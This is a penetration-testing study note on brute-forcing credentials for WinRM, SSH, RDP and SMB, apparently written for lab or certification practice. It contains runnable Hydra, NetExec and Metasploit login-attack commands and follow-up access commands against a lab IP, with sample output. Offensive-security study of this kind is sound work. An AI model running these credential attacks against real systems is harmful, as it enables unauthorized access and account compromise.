# Attacking Authenticated Remote Services

## Overview

Many common network services rely on username/password authentication.

Examples include:

- WinRM
- SSH
- RDP
- SMB
- FTP
- MSSQL
- LDAP
- VNC
- Telnet

In password attack scenarios, these services are valuable because valid credentials may provide:

- remote shell access
- GUI access
- file access
- lateral movement
- privilege escalation opportunities
- domain visibility

This note focuses on **testing credentials against remote management and access services**.

---

# Common Target Services

| Service | Typical Port | Typical Use |
|---------|--------------|-------------|
| WinRM | 5985 / 5986 | remote PowerShell management |
| SSH | 22 | remote shell / file transfer |
| RDP | 3389 | remote Windows GUI access |
| SMB | 445 | file sharing / admin access |
| FTP | 21 | file transfer |
| MSSQL | 1433 | SQL server access |
| LDAP | 389 / 636 | directory services |
| VNC | 5900+ | remote desktop |
| Telnet | 23 | insecure remote shell |

---

# General Workflow

Typical workflow for remote service password attacks:

1. identify exposed service
2. determine whether authentication is enabled
3. choose appropriate login attack tool
4. test credentials carefully
5. validate successful logins manually
6. enumerate what access the credentials actually provide

Important:

**A valid username/password does not always mean useful access.**

Example:

- valid RDP credentials but not allowed to log in via RDP
- valid SMB creds but only read access
- valid WinRM creds with command execution
- valid SSH creds but restricted shell

---

# Key Tools

Most useful tools in this workflow:

- NetExec
- Hydra
- Evil-WinRM
- xfreerdp
- smbclient
- OpenSSH client
- Metasploit auxiliary scanners

---

# NetExec

## Overview

NetExec is a multi-protocol authentication and post-auth testing tool.

It supports protocols such as:

- winrm
- smb
- ssh
- rdp
- mssql
- ldap
- ftp
- vnc
- nfs
- wmi

It is often one of the most efficient tools for password attacks against enterprise services.

---

## Install

```bash
sudo apt-get -y install netexec
```

---

## Help

```bash
netexec -h
```

---

## General Syntax

```bash
netexec <proto> <target> -u <user/userlist> -p <password/passwordlist>
```

Example:

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

---

# WinRM

## Overview

WinRM (Windows Remote Management) is Microsoft's WS-Management implementation for remote administration.

Uses:

- PowerShell Remoting
- WMI/WBEM communication
- remote command execution
- Windows host administration

Default ports:

- `5985/tcp` = HTTP
- `5986/tcp` = HTTPS

WinRM is extremely valuable because valid credentials may directly provide command execution.

---

## Attack with NetExec

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```

Example success:

```text
[+] None\user:password (Pwn3d!)
```

### Meaning of `(Pwn3d!)`

Usually indicates:

- valid credentials
- likely command execution capability

This is one of the most useful success indicators in NetExec.

---

## Access with Evil-WinRM

Install:

```bash
sudo gem install evil-winrm
```

Connect:

```bash
evil-winrm -i 10.129.42.197 -u user -p password
```

Successful connection gives:

```text
*Evil-WinRM* PS C:\Users\user\Documents>
```

Use Evil-WinRM when you want:

- PowerShell access
- file upload/download
- script execution
- practical post-exploitation on Windows

---

# SSH

## Overview

SSH is the standard remote administration protocol for Linux and Unix systems.

Default port:

- `22/tcp`

It supports:

- remote shell access
- secure file transfer
- port forwarding
- key-based authentication
- password authentication

SSH is one of the most common password attack targets in Linux environments.

---

## Brute Force with Hydra

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

### Important note

SSH often limits parallel authentication attempts.

Recommended:

```bash
-t 4
```

Example:

```bash
hydra -L user.list -P password.list -t 4 ssh://10.129.42.197
```

---

## Log In with OpenSSH Client

```bash
ssh user@10.129.42.197
```

If successful, you get shell access.

---

# RDP

## Overview

RDP (Remote Desktop Protocol) provides remote GUI access to Windows hosts.

Default port:

- `3389/tcp`

RDP is useful because valid credentials may provide:

- full desktop access
- ability to interact with applications
- access to clipboard / mounted drives
- easier user-context enumeration

---

## Brute Force with Hydra

```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

### Important note

RDP services often dislike many concurrent connections.

Recommended options:

- lower task count
- add delay if necessary

Example:

```bash
hydra -L user.list -P password.list -t 4 rdp://10.129.42.197
```

Hydra may report:

```text
account might be valid but account not active for remote desktop
```

Meaning:

- credentials may be valid
- but RDP logon is not permitted

---

## Connect with xfreerdp

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password
```

On first connection, accept certificate if appropriate.

---

# SMB

## Overview

SMB (Server Message Block) is Windows’ primary file sharing and remote resource access protocol.

Default port:

- `445/tcp`

SMB is important because valid credentials may provide:

- shared file access
- remote administration
- writable shares
- lateral movement paths
- password reuse opportunities

---

## Brute Force with Hydra

```bash
hydra -L user.list -P password.list smb://10.129.42.197
```

### Important note

SMB often does not like parallel brute force.

Hydra usually reduces to:

```text
max 1 task per 1 server
```

### Common Hydra issue

```text
[ERROR] invalid reply from target smb://...
```

Possible cause:

- Hydra version too old
- SMBv3 incompatibility

In that case, prefer:

- NetExec
- Metasploit `smb_login`

---

## Brute Force with Metasploit

```bash
msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE user.list
set PASS_FILE password.list
set RHOSTS 10.129.42.197
run
```

Example success:

```text
Success: '.\user:password'
```

---

## Enumerate Shares with NetExec

```bash
netexec smb 10.129.42.197 -u user -p password --shares
```

Useful to identify:

- readable shares
- writable shares
- admin shares
- IPC access

---

## Access Shares with smbclient

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

From there, you can:

- list files
- download files
- upload files if write access exists

Basic commands inside smbclient:

```text
ls
cd
get file.txt
put file.txt
help
```

---

# Choosing the Right Tool

## NetExec

Best for:

- fast protocol-wide auth testing
- quick success validation
- share enumeration
- enterprise environments

## Hydra

Best for:

- broad brute-force support
- simple login testing
- services like SSH / RDP / FTP

## Evil-WinRM

Best for:

- actual interactive WinRM access after success

## xfreerdp

Best for:

- validating RDP credentials
- gaining GUI access

## smbclient

Best for:

- validating SMB file access
- interacting with shares directly

## Metasploit auxiliary modules

Best for:

- protocol-specific login testing
- environments where Hydra has compatibility problems

---

# Practical Considerations

## Account lockout risk

Always consider:

- lockout thresholds
- rate limiting
- monitoring / alerting
- parallelism

Safer settings often matter more than speed.

---

## Service-specific limitations

- SSH may restrict concurrent attempts
- RDP may reject heavy connection volume
- SMB may require one-at-a-time login attempts
- WinRM may allow auth but not useful command execution in all cases

---

## Success validation

A “success” must be followed by validation:

- can you actually log in?
- can you execute commands?
- do you have file access?
- are you local admin?
- is access restricted?

---

# Typical Workflow

## WinRM

1. test with NetExec
2. look for `(Pwn3d!)`
3. connect with Evil-WinRM

## SSH

1. brute force with Hydra
2. connect with `ssh`

## RDP

1. brute force with Hydra
2. connect with `xfreerdp`

## SMB

1. test creds with NetExec or Metasploit
2. enumerate shares
3. connect with `smbclient`

---

# Key Takeaways

- many remote services rely on password authentication
- valid credentials can provide shell, GUI, or file access
- NetExec is one of the most useful tools for multi-protocol auth testing
- Hydra is still very useful, but some protocols require lower concurrency
- SMB successes should always be followed by share enumeration
- WinRM is especially valuable because valid creds often lead directly to remote command execution

---

# Related Notes

- Password Attacks — Hydra
- Password Attacks — Custom Wordlists & Rules
- Enumeration — SMB
- Enumeration — WinRM
- Enumeration — SSH
- Enumeration — MSSQL

---

# Tags

#password-attacks #winrm #ssh #rdp #smb #hydra #netexec #evil-winrm #oscp